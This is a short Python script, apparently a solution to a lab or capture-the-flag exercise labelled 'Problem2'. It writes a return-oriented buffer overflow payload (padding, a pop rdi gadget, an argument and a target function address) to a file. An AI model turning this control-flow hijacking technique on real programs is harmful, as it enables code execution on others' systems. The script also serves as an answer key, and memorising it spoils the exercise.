padding = b"A" * 16

# 目标函数地址
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

# func2需要的参数
arg = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

payload = padding + pop_rdi_addr + arg + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Problem2 payload written to ans2.txt")